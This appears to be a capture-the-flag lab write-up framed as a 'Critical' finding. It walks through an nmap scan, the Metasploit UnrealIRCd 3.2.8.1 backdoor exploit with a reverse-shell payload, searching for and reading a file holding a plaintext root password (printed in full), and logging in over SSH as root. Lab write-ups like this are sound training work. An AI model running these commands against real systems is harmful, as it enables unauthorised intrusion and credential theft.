Title : Root Password Stored in Plaintext

Severity : Critical

Description Steps : The root user's password was found stored in plaintext within the file /etc/password.txt. This file was readable by
low-privileged users, allowing any user with shell access to retrieve the root credentials and fully compromise the system.





I execute a nmap scan with "nmap -sV -sC ip_adress"
Starting Nmap 7.93 ( https://nmap.org ) at 2026-09-25 20:55 CEST
Nmap scan report for 10.130.188.149
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ae62c097860ca225c5de8f4fc910cec8 (ECDSA)
|_  256 a9a48eec3a5cb3572a734228dca1b4db (ED25519)
6667/tcp open  irc     UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.pentest-target.thm
|   version: Unreal3.2.8.1. irc.pentest-target.thm 
|   uptime: 0 days, 0:02:43
|   source ident: nmap
|   source host: ip-192-168-133-132.eu-west-3.compute.internal
|_  error: Closing Link: jbduytlcr[ip-192-168-133-132.eu-west-3.compute.internal] (Quit: jbduytlcr)
Service Info: Host: irc.pentest-target.thm; OS: Linux; CPE: cpe:/o:linux:linux_kernel


I see the port 6667 in vulnerable. beacuse I found a exploit in ExploitDB.
So let's sart msfconsole ! 

msf > search Unreal3.2.8.1

Matching Modules
================

   #  Full Name                                   Disclosure Date  Rank       Check  Name
   -  ---------                                   ---------------  ----       -----  ----
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  Yes    UnrealIRCD 3.2.8.1 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor

okay, go use 0 for exploit this room.

I set LHOST and RHOSTS so, GO RUN
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload /cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > 

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > 
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP double handler on 192.168.133.132:4444 
[*] 10.128.163.195:6667 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.128.163.195:6667 - Connected to 10.128.163.195:6667
[*] 10.128.163.195:6667 - Trying to register a new IRC user: brain
[+] 10.128.163.195:6667 - The target appears to be vulnerable. UnrealIRCd detected after registration
[*] 10.128.163.195:6667 - Connected to 10.128.163.195:6667
[*] 10.128.163.195:6667 - Sending IRC backdoor command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo udBZjQzuliA2TLrj;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "udBZjQzuliA2TLrj\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.133.132:4444 -> 10.128.163.195:34628) at 2026-09-26 11:42:50 +0200

okay nice I have a meterpreter :)

so, I put a command for listing all folder with password 
find / -name password* 2>/dev/null
/boot/grub/i386-pc/password.mod
/boot/grub/i386-pc/password_pbkdf2.mod
/snap/core20/2379/var/lib/pam/password
/snap/core/17272/usr/lib/pppd/2.4.7/passwordfd.so
/snap/core/17272/var/cache/debconf/passwords.dat
/snap/core/17272/var/lib/pam/password
/snap/core18/2999/var/lib/pam/password
/snap/core18/1885/var/lib/pam/password
/snap/core22/1621/var/lib/pam/password
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/etc/password.txt
/var/lib/pam/password
/var/cache/debconf/passwords.dat
cat /etc/password.txt
I go to the /etc/password.txt and I have the root password for ssh session !
root:PDLrCVl1pLD91U0JMmCz

root@debian:/home/mao# ssh root@10.128.163.195
The authenticity of host '10.128.163.195 (10.128.163.195)' can't be established.
ED25519 key fingerprint is SHA256:k41A+T3WMbpEU3PcaNgaJwKdAOWURE0VTO+7SHabM54.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.128.163.195' (ED25519) to the list of known hosts.
root@10.128.163.195's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Sep 26 09:49:50 UTC 2026

  System load:  0.0                Temperature:           -273.1 C
  Usage of /:   13.2% of 19.31GB   Processes:             111
  Memory usage: 9%                 Users logged in:       0
  Swap usage:   0%                 IPv4 address for ens5: 10.128.163.195


Expanded Security Maintenance for Applications is not enabled.

261 updates can be applied immediately.
146 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Thu Jan  1 00:00:10 1970
root@pentest-target:~#

I'm root !
Now I put cat /root/flag.txt

